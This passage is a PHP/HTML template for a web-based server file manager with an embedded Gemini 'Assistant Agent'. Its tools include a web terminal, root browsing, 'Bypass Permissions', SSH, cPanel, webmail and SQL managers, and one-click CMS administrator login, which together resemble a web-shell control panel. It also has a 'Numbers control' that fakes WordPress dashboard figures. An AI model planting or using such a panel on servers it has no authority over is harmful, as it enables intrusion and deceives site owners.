  .ib{width:30px;height:30px;border-radius:8px}.ib .ti{width:17px;height:17px}
  .eb{display:none}
  .col-size,.col-size-td{display:none}
  .bs:nth-child(n+4):not(:last-child){display:none}
  .gv{grid-template-columns:repeat(auto-fill,minmax(80px,1fr))}
  .toolbar{padding:7px 8px}
  .toolbar .tb-row{gap:5px}
  .toolbar .tb-row .inp{min-width:0}
  .content{padding:8px}
}
</style>
</head>
<body class="<?=$terminalStandalone?'term-standalone':''?>">
<div class="shell">

<!-- TOPBAR -->
<header class="topbar">
  <button class="btn btn-icon btn-g menu-btn" id="menuBtn" aria-label="Menu">
    <svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
  </button>
  <a href="?dir=<?=urlencode(__DIR__)?>" class="brand">
     <div class="brand-icon"><img src="https://github.com/orgezeo/marshal-file-manager/blob/main/images/icons/mfm.png?raw=true" alt="File Manager"></div>
    <span class="brand-name">File Manager</span>
  </a>
  <div class="dv"></div>
  <nav class="bc" aria-label="Breadcrumb">
    <?php $bcs=$fm->breadcrumbs();$last=count($bcs)-1;foreach($bcs as $i=>$b):?>
    <div class="bc-crumb">
      <?php if($i>0):?><span class="bc-sep">/</span><?php endif;?>
      <a href="?dir=<?=urlencode($b['path'])?>" class="<?=$i===$last?'last':''?>"><?=htmlspecialchars(mb_strimwidth($b['label'],0,18,'…'))?></a>
    </div>
    <?php endforeach;?>
  </nav>
  <form method="get" class="tsearch">
    <input type="hidden" name="dir" value="<?=htmlspecialchars($fm->getCwd())?>">
    <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
    <input type="text" name="q" placeholder="Search files…" value="<?=htmlspecialchars(isset($_GET['q'])?$_GET['q']:'')?>">
  </form>
  <div class="tb-right">
    <?php $isFav=$fm->isFav($fm->getCwd());?>
    <form method="post" class="top-fav" style="display:contents">
      <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
      <input type="hidden" name="action" value="<?=$isFav?'remove_favorite':'add_favorite'?>">
      <input type="hidden" name="path" value="<?=htmlspecialchars($fm->getCwd())?>">
      <button class="btn btn-icon <?=$isFav?'btn-star':'btn-g'?>" title="<?=$isFav?'Unfavorite':'Favorite'?>">
        <svg viewBox="0 0 24 24" fill="<?=$isFav?'currentColor':'none'?>" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
      </button>
    </form>
    <button type="button" class="btn btn-icon btn-g" id="themeBtn" title="Toggle theme">
      <svg id="themeIcoSun" viewBox="0 0 24 24" style="display:none"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
      <svg id="themeIcoMoon" viewBox="0 0 24 24"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
    </button>
    <button type="button" class="btn btn-icon btn-g" id="viewBtn" title="Toggle view">
      <svg id="vIcoGrid" viewBox="0 0 24 24" style="display:none"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
      <svg id="vIcoList" viewBox="0 0 24 24"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>
    </button>
    <a href="?dir=<?=urlencode(dirname($fm->getCwd()))?>" class="btn btn-sm btn-g top-up"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg><span>Up</span></a>
    <a href="?<?=http_build_query(array_merge($_GET,['_r'=>time()]))?>" class="btn btn-icon btn-g" title="Refresh">
      <svg viewBox="0 0 24 24"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
    </a>
    <?php if(!empty($_SESSION['fm_admin'])):?>
    <button type="button" class="btn btn-sm btn-g" id="usersBtn"><svg viewBox="0 0 24 24"><circle cx="9" cy="7" r="4"/><path d="M2 21v-2a4 4 0 0 1 4-4h6a4 4 0 0 1 4 4v2"/><circle cx="19" cy="8" r="3"/></svg><span>Users</span></button>
    <?php endif;?>
    <span style="font-size:11.5px;color:var(--t3);padding:0 2px;white-space:nowrap"><?=htmlspecialchars($_SESSION['fm_user']??'')?></span>
    <div class="dv"></div>
    <form method="post">
      <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
      <input type="hidden" name="action" value="logout">
      <button class="btn btn-sm btn-red"><svg viewBox="0 0 24 24"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg><span>Logout</span></button>
    </form>
  </div>
</header>

<div class="ov" id="sideOv"></div>

<!-- SIDEBAR -->
<aside class="sidebar" id="sidebar">
  <div class="sb-sec">
    <div class="sb-nav">
      <a href="?dir=<?=urlencode($fm->getSysRoot())?>" class="sb-item"><svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>Root (/)</a>
      <a href="?dir=<?=urlencode(__DIR__)?>" class="sb-item"><svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>Home</a>
      <a href="?dir=<?=urlencode(dirname($fm->getCwd()))?>" class="sb-item"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>Up one level</a>
      <a href="?<?=http_build_query(array_merge($_GET,['hidden'=>$curHidden?'0':'1']))?>" class="sb-item">
        <svg viewBox="0 0 24 24"><?=$curHidden?'<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>':'<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>'?></svg><?=$curHidden?'Hide dotfiles':'Show dotfiles'?>
      </a>
    </div>
  </div>
  <div class="sb-div"></div>
  <div class="sb-sec" style="flex-shrink:1;min-height:0;display:flex;flex-direction:column"><div class="sb-label">Tools</div>
    <div class="sb-nav" style="overflow-y:auto;overflow-x:hidden;min-height:0;flex:1">
       <?php if(!empty($_SESSION['auth'])):?>
       <button class="sb-item" id="cmsQuickBtn" title="Open the configured CMS administrator account">
         <svg viewBox="0 0 24 24" style="stroke:#2563eb"><path d="M12 20h9"/><path d="M16.5 3.5a2.12 2.12 0 0 1 3 3L8 18l-4 1 1-4Z"/><path d="m15 5 3 3"/></svg>CMS MFM ACC Login
       </button>
       <?php endif;?>
       <?php if(!$fm->isRO()):?>
       <button class="sb-item" id="termBtn"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>Terminal</button>
       <?php endif;?>
       <button class="sb-item" id="agentBtn" title="Open Assistant Agent">
         <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M7.5 4.5c-2.4 0-4 1.6-4 4v4.5c0 2.4 1.6 4 4 4h1.2l2.3 2.1 2.3-2.1h1.2c2.4 0 4-1.6 4-4V8.5c0-2.4-1.6-4-4-4h-7z"/><path d="M8 11.5h.01M16 11.5h.01"/><path d="M8.5 14.5c1.8 1.2 5.2 1.2 7 0"/></svg>Assistant Agent
       </button>
      <button class="sb-item" id="actBtn"><svg viewBox="0 0 24 24"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>Activity Log</button>
      <button class="sb-item" id="srvBtn"><svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>Server Info</button>
      <?php if(!$fm->isRO()):?>
      <button class="sb-item" id="brBtn"><svg viewBox="0 0 24 24"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"/></svg>Batch Rename</button>
      <button class="sb-item" id="symlinkBtn"><svg viewBox="0 0 24 24"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>Symlink</button>
      <button class="sb-item" id="sharesBtn"><svg viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>Share Links</button>
      <form method="post" style="width:100%">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="backup_dir">
        <button type="button" onclick="if(confirm('Create a .zip backup of the current folder?'))this.closest('form').submit()" class="sb-item"><svg viewBox="0 0 24 24"><path d="M21 8v13H3V8"/><path d="M1 3h22v5H1z"/><line x1="10" y1="12" x2="14" y2="12"/></svg>Backup Folder</button>
      </form>
      <?php endif;?>
      <button class="sb-item" id="largeBtn"><svg viewBox="0 0 24 24"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><line x1="9" y1="15" x2="15" y2="15"/></svg>Large Files</button>
      <button class="sb-item" id="dupBtn"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Find Duplicates</button>
      <button class="sb-item" id="speedBtn"><svg viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>Speed Test</button>
      <?php if(!empty($_SESSION['fm_admin'])):?>
      <button class="sb-item" id="errLogBtn"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>Error Log</button>
      <button class="sb-item" id="envBtn"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>Environment</button>
      <a href="?x=phpinfo" target="_blank" class="sb-item"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 2-3 4"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>PHP Info</a>
      <button class="sb-item" id="sshBtn"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>SSH Access</button>
      <button class="sb-item" id="cmsBtn"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>CMS Manager</button>
      <button class="sb-item" id="cpanelBtn"><svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8"/><path d="M12 17v4"/><circle cx="12" cy="10" r="3"/></svg>cPanel Manager</button>
      <button class="sb-item" id="webmailBtn"><svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22 6 12 13 2 6"/></svg>Webmail Manager</button>
      <button class="sb-item" id="sqlBtn"><svg viewBox="0 0 24 24"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>SQL Manager</button>
      <button class="sb-item" id="wpAutomationBtn"><svg viewBox="0 0 24 24"><path d="M12 2v4"/><path d="M12 18v4"/><path d="M4.93 4.93l2.83 2.83"/><path d="M16.24 16.24l2.83 2.83"/><path d="M2 12h4"/><path d="M18 12h4"/><path d="M4.93 19.07l2.83-2.83"/><path d="M16.24 7.76l2.83-2.83"/><circle cx="12" cy="12" r="3"/></svg>WordPress Automation</button>
      <button class="sb-item" id="wpNumbersBtn" title="Change displayed WordPress dashboard numbers without changing site data"><svg viewBox="0 0 24 24"><path d="M4 19V5"/><path d="M4 19h16"/><path d="M8 15v-3"/><path d="M12 15V8"/><path d="M16 15V5"/><path d="M20 15V3"/></svg>Numbers control</button>
      <button class="sb-item" id="guardBtn"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>File Guardian</button>
      <?php endif;?>
    </div>
  </div>
  <div class="sb-div"></div>
  <div style="padding:0 8px 4px;flex-shrink:0"><div class="sb-label">Favorites</div></div>
  <div style="padding:0 8px;flex-shrink:0;max-height:28vh;overflow-y:auto">
    <?php $favs=$fm->getFavs();foreach($favs as $fp):?>
    <div class="sb-fav-row">
      <a href="?dir=<?=urlencode($fp)?>" class="sb-flink" style="flex:1">
        <svg viewBox="0 0 24 24" fill="#f59e0b" stroke="#f59e0b" stroke-width="1.5"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
        <span><?=htmlspecialchars(basename($fp))?></span>
      </a>
      <form method="post"><input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>"><input type="hidden" name="action" value="remove_favorite"><input type="hidden" name="path" value="<?=htmlspecialchars($fp)?>">
        <button class="sb-fav-del"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
      </form>
    </div>
    <?php endforeach;if(empty($favs)):?><div class="sb-empty">No favorites yet</div><?php endif;?>
  </div>
  <div class="sb-div"></div>
  <div style="padding:0 8px 4px;flex-shrink:0"><div class="sb-label">Folders here</div></div>
  <div class="sb-scroll">
    <?php foreach($list['folders'] as $f):?>
    <a href="?dir=<?=urlencode($fm->getCwd().'/'.$f['name'])?>" class="sb-flink">
       <svg viewBox="0 0 24 24" stroke="#85898C" fill="none" stroke-width="1.8" stroke-linecap="round"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" fill="rgba(133,137,140,.12)"/></svg>
      <span><?=htmlspecialchars($f['name'])?></span>
    </a>
    <?php endforeach;if(empty($list['folders'])):?><div class="sb-empty">No folders</div><?php endif;?>
  </div>
  <div class="sb-footer">
    <div class="disk-w">
      <div class="disk-lbl"><span>Disk</span><span><?=fmtSz($diskUsed)?> / <?=fmtSz($diskTotal)?></span></div>
      <div class="disk-tr"><div class="disk-fi <?=$diskPct>=90?'crit':($diskPct>=75?'warn':'')?>" style="width:<?=$diskPct?>%"></div></div>
    </div>
    <?php if(!$fm->isRO()):?>
    <form method="post">
      <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
      <input type="hidden" name="action" value="bypass_perms">
      <button type="button" onclick="if(confirm('Change permissions recursively?'))this.closest('form').submit()" class="sb-item danger">
        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Bypass Permissions
      </button>
    </form>
    <?php endif;?>
  </div>
</aside>

<!-- ASSISTANT AGENT SIDE PANEL -->
<aside class="agent-panel" id="agentPanel" aria-label="Assistant Agent">
  <div class="agent-resize" id="agentResize" role="separator" aria-orientation="vertical" aria-label="Resize Assistant Agent"></div>
  <div class="agent-head">
    <div class="agent-mark">
      <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M7.5 4.5c-2.4 0-4 1.6-4 4v4.5c0 2.4 1.6 4 4 4h1.2l2.3 2.1 2.3-2.1h1.2c2.4 0 4-1.6 4-4V8.5c0-2.4-1.6-4-4-4h-7z"/><path d="M8 11.5h.01M16 11.5h.01"/><path d="M8.5 14.5c1.8 1.2 5.2 1.2 7 0"/></svg>
    </div>
     <div class="agent-head-copy"><div class="agent-head-title">Assistant Agent</div><div class="agent-head-sub">Your server workspace companion</div></div>
     <div class="agent-head-actions">
       <button type="button" class="btn btn-icon" id="agentSettingsBtn" title="Gemini settings" aria-label="Gemini settings">
         <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.7 1.7 0 0 0 .3 1.9l.1.1-1.7 1.7-.1-.1a1.7 1.7 0 0 0-1.9-.3 1.7 1.7 0 0 0-1 1.5v.2h-2.4v-.2a1.7 1.7 0 0 0-1-1.5 1.7 1.7 0 0 0-1.9.3l-.1.1L8 17l.1-.1A1.7 1.7 0 0 0 8.4 15a1.7 1.7 0 0 0-1.5-1H6.7v-2.4h.2a1.7 1.7 0 0 0 1.5-1A1.7 1.7 0 0 0 8.1 8.7L8 8.6l1.7-1.7.1.1a1.7 1.7 0 0 0 1.9.3 1.7 1.7 0 0 0 1-1.5v-.2h2.4v.2a1.7 1.7 0 0 0 1 1.5 1.7 1.7 0 0 0 1.9-.3l.1-.1 1.7 1.7-.1.1a1.7 1.7 0 0 0-.3 1.9 1.7 1.7 0 0 0 1.5 1h.2V14h-.2a1.7 1.7 0 0 0-1.5 1Z"/></svg>
       </button>
       <button type="button" class="btn btn-icon" id="agentClose" title="Close Assistant Agent" aria-label="Close Assistant Agent">
         <svg viewBox="0 0 24 24" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
       </button>
     </div>
  </div>
  <div class="agent-settings" id="agentSettings" hidden>
    <div class="agent-settings-title">Gemini API connection</div>
    <p>Use your own Google AI Studio key. It is encrypted on this server and never included in chat history.</p>
    <form id="agentConfigForm" autocomplete="off">
      <div class="agent-key-row"><input type="password" id="agentKeyInput" name="gemini_api_key" placeholder="Paste Gemini API key" autocomplete="off" spellcheck="false"><button type="submit" class="btn btn-xs btn-blue">Save</button></div>
    </form>
    <div class="agent-key-state" id="agentKeyState">Not configured</div>
    <a href="https://aistudio.google.com/apikey" target="_blank" rel="noopener" class="agent-key-link">Get a Gemini API key ↗</a>
  </div>
  <div class="agent-messages" id="agentMessages">
    <div class="agent-welcome" id="agentWelcome">
      <div class="agent-welcome-icon"><svg viewBox="0 0 24 24"><path d="M7.5 4.5c-2.4 0-4 1.6-4 4v4.5c0 2.4 1.6 4 4 4h1.2l2.3 2.1 2.3-2.1h1.2c2.4 0 4-1.6 4-4V8.5c0-2.4-1.6-4-4-4h-7z"/><path d="M8 11.5h.01M16 11.5h.01"/><path d="M8.5 14.5c1.8 1.2 5.2 1.2 7 0"/></svg></div>
      <strong>How can I help?</strong>
      <p>Ask me to inspect, organize, or manage this workspace. I’ll show every terminal command and file action as it happens.</p>
    </div>
  </div>
  <div class="agent-compose">
    <div class="agent-compose-box">
      <textarea id="agentInput" rows="1" maxlength="8000" placeholder="Ask MFM Assistant Agent to do something…" aria-label="Message MFM Assistant Agent"></textarea>
      <button type="button" class="agent-send" id="agentSend" aria-label="Send message">
        <svg viewBox="0 0 24 24"><path d="M22 2 11 13"/><path d="m22 2-7 20-4-9-9-4Z"/></svg>
      </button>
    </div>
    <div class="agent-compose-hint"><span>Enter to send · Shift+Enter for a new line</span><span class="agent-cwd" id="agentCwd"></span></div>
  </div>
</aside>

<!-- MAIN -->
<main class="main">
  <?php if(!$editMode):?>
  <div class="toolbar">
    <?php if(!$fm->isRO()):?>
    <div class="tb-row" style="flex-wrap:wrap;gap:6px">
      <form method="post" enctype="multipart/form-data" id="uploadForm">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="upload">
        <input type="file" name="file[]" id="upFile" multiple>
        <label for="upFile" class="upl-lbl"><svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>Upload</label>
      </form>
      <form method="post" style="display:contents">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="create_folder">
        <input type="text" name="folder_name" class="inp" placeholder="New folder…" required style="width:130px">
        <button class="btn btn-sm btn-green"><svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg><span>Folder</span></button>
      </form>
      <form method="post" style="display:contents">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="create_file">
        <input type="text" name="file_name" class="inp" placeholder="New file…" required style="width:120px">
        <button class="btn btn-sm btn-blue"><svg viewBox="0 0 24 24"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><line x1="12" y1="13" x2="12" y2="19"/><line x1="9" y1="16" x2="15" y2="16"/></svg><span>File</span></button>
      </form>
      <button type="button" id="remoteDlBtn" class="btn btn-sm btn-g"><svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg><span>From URL</span></button>
    </div>
    <?php endif;?>
    <div class="tb-row" style="flex-wrap:wrap;gap:6px">
      <?php if(!$fm->isRO()):?>
      <button type="button" class="btn btn-sm btn-g" id="clipCopy" title="Keep selected items for copying"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Copy</button>
      <button type="button" class="btn btn-sm btn-amb" id="clipCut" title="Keep selected items for moving"><svg viewBox="0 0 24 24"><path d="M6 2l12 20M18 2L6 22"/><circle cx="6" cy="6" r="3"/><circle cx="18" cy="18" r="3"/></svg>Cut</button>
      <button type="button" class="btn btn-sm btn-blue" id="clipPaste" title="Paste clipboard items here"><svg viewBox="0 0 24 24"><path d="M16 4h2a2 2 0 0 1 2 2v14H4V6a2 2 0 0 1 2-2h2"/><rect x="8" y="2" width="8" height="4" rx="1"/></svg>Paste</button>
      <?php endif;?>
      <form method="post" style="display:contents">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="go_to_path">
        <input type="text" name="path" class="inp" placeholder="Jump to path…" style="flex:1;min-width:140px">
        <button class="btn btn-sm btn-g"><svg viewBox="0 0 24 24"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>Go</button>
      </form>
      <form method="get" style="display:contents">
        <input type="hidden" name="dir" value="<?=htmlspecialchars($fm->getCwd())?>">
        <input type="text" name="cs" class="inp" placeholder="Search in file contents…" value="<?=htmlspecialchars(isset($_GET['cs'])?$_GET['cs']:'')?>" style="flex:1;min-width:160px">
        <label style="display:flex;align-items:center;gap:4px;font-size:11.5px;color:var(--t2);cursor:pointer;white-space:nowrap"><input type="checkbox" name="deep" value="1" <?=isset($_GET['deep'])&&$_GET['deep']==='1'?'checked':''?>>Deep</label>
        <button class="btn btn-sm btn-g"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>Find</button>
      </form>
    </div>
  </div>
  <?php endif;?>

  <div class="content" id="dropzone">
    <!-- Alerts -->
    <?php if(!empty($fm->getMsgs())):?>
    <div class="alerts">
      <?php foreach($fm->getMsgs() as $msg):$icons=['success'=>'<polyline points="20 6 9 17 4 12"/>','danger'=>'<line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>','warning'=>'<path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>'];$ic=isset($icons[$msg['type']])?$icons[$msg['type']]:'';?>
      <div class="alert <?=htmlspecialchars($msg['type'])?>" role="alert">
        <svg viewBox="0 0 24 24"><?=$ic?></svg><?=htmlspecialchars($msg['text'])?>
        <button class="alert-x"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
      </div>
      <?php endforeach;?>
    </div>
    <?php endif;?>

    <?php if(isset($_GET['cs'])&&$_GET['cs']!==''):
      $cs=$fm->contentSearch($_GET['cs'],isset($_GET['deep'])&&$_GET['deep']==='1');?>
    <div class="card" style="margin-bottom:12px">
      <div style="padding:10px 14px;background:var(--raised);border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px">
        <svg viewBox="0 0 24 24" fill="none" stroke="var(--link)" stroke-width="2" stroke-linecap="round" style="width:15px;height:15px;flex-shrink:0"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
        <span style="font-size:13px;font-weight:700;color:var(--t1)">Results: "<?=htmlspecialchars($_GET['cs'])?>"</span>
        <span style="font-size:11px;color:var(--t3)"><?=count($cs)?> match(es)</span>
        <a href="?dir=<?=urlencode($fm->getCwd())?>" class="btn btn-xs btn-g" style="margin-left:auto">Clear</a>
      </div>
      <?php foreach($cs as $r):?>
      <div style="padding:10px 14px;border-bottom:1px solid var(--border)">
        <a href="?edit=<?=urlencode($r['name'])?>&dir=<?=urlencode($r['dir'])?>" style="font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--link);display:block;margin-bottom:4px;text-decoration:none;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"><?=htmlspecialchars($r['path'])?></a>
        <div style="font-size:11.5px;color:var(--t3);font-family:'JetBrains Mono',monospace;background:var(--raised);padding:5px 9px;border-radius:5px;line-height:1.6">…<?=htmlspecialchars($r['snippet'])?>…</div>
      </div>
      <?php endforeach;if(!$cs):?><div class="empty" style="padding:28px"><p>No matches.</p></div><?php endif;?>
    </div>
    <?php endif;?>

    <?php if($editMode):?>
    <!-- EDITOR -->
    <div class="ed-card">
      <div class="ed-head">
        <div class="ed-fname"><svg viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg><?=htmlspecialchars($editFile)?></div>
        <span class="ed-meta"><?=number_format(strlen($editContent))?> bytes · <?=substr_count($editContent,"\n")+1?> lines</span>
        <a href="?dir=<?=urlencode(isset($_GET['dir'])?$_GET['dir']:'')?>" class="btn btn-xs btn-g" style="margin-left:8px"><svg viewBox="0 0 24 24"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back</a>
      </div>
      <form method="post">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="save_edit"><input type="hidden" name="filename" value="<?=htmlspecialchars($editFile)?>">
        <div class="ed-tools">
          <input type="text" id="edFind" class="inp" placeholder="Find…" aria-label="Find text">
          <input type="text" id="edReplace" class="inp" placeholder="Replace with…" aria-label="Replacement text">
          <button type="button" class="btn btn-xs btn-g" id="edFindNext">Find next</button>
          <button type="button" class="btn btn-xs btn-g" id="edReplaceOne">Replace</button>
          <button type="button" class="btn btn-xs btn-g" id="edReplaceAll">Replace all</button>
          <button type="button" class="btn btn-xs btn-blue" id="edFormatJson">Format JSON</button>
          <span class="ed-dirty" id="edDirty">Unsaved changes</span>
        </div>
        <div class="ed-wrap"><div class="ed-lines" id="edLines">1</div><textarea name="content" id="editorTA" class="code" spellcheck="false"><?=htmlspecialchars($editContent)?></textarea></div>
        <div class="ed-foot">
          <div class="ed-hint"><kbd>Tab</kbd> indent &nbsp;·&nbsp; <kbd>Ctrl+S</kbd> save</div>
          <div style="display:flex;gap:6px">
            <a href="?dir=<?=urlencode(isset($_GET['dir'])?$_GET['dir']:'')?>" class="btn btn-sm btn-g">Cancel</a>
